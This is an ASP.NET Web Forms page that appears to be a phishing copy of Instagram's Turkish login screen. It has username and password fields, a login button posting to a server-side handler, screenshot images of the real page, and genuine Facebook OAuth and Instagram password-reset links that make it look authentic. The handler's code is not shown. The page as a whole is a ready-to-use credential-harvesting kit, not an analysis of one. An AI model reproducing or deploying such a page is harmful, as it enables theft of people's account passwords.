<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="default.aspx.cs" Inherits="site2.WebForm1" %>

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
    <title></title>
</head>
<body>
    <form id="form1" runat="server">
        
        <center>
            <asp:Image ID="Image1" runat="server" ImageUrl="~/Images/in1.JPG" />
            <br />
            <asp:TextBox ID="TextBox1" runat="server" Height="21px" Width="245px" ForeColor="#999999" Font-Size="11px" onclick="javascript:this.value=' ' ">Telefon numarası, kullanıcı adı veya e-mail</asp:TextBox>
            <br />
            <br />
            <asp:TextBox ID="TextBox2" runat="server" Height="21px" Width="245px" ForeColor="#999999" Font-Size="11px" onclick="javascript:this.value=' ' ">Şifre</asp:TextBox>
            <br />
            <br />
            <asp:Button ID="Button1" runat="server" OnClick="Button1_Click" BackColor="#0095F6" BorderColor="#0095F6" ForeColor="White" Text="Giriş Yap" Width="250px" Font-Bold BorderStyle="Outset" BorderWidth="0px" Height="28px" />
            <br />
            <br />
            <asp:Image ID="Image2" runat="server" ImageUrl="~/Images/in3.JPG" />
            <br />
            <br />
            <asp:ImageButton ID="ImageButton2" runat="server" ImageUrl="~/Images/in4.JPG" PostbackUrl="https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%2522r29yv71fkrvbk1hjvfm81qxjv5p18weu5z13dpesz1k5t0501sna62o%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Dtr_TR%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D464432b3-b4cf-4618-b49f-c2f780253110&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522r29yv71fkrvbk1hjvfm81qxjv5p18weu5z13dpesz1k5t0501sna62o%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%23_%3D_&display=page&locale=tr_TR&pl_dbl=0" OnClick="ImageButton2_Click" />
            <br />
            <br />
            <asp:ImageButton ID="ImageButton3" runat="server" ImageUrl="~/Images/in5.JPG" PostBackUrl="https://www.instagram.com/accounts/password/reset" />
        </center>
        
    </form>
</body>
</html>
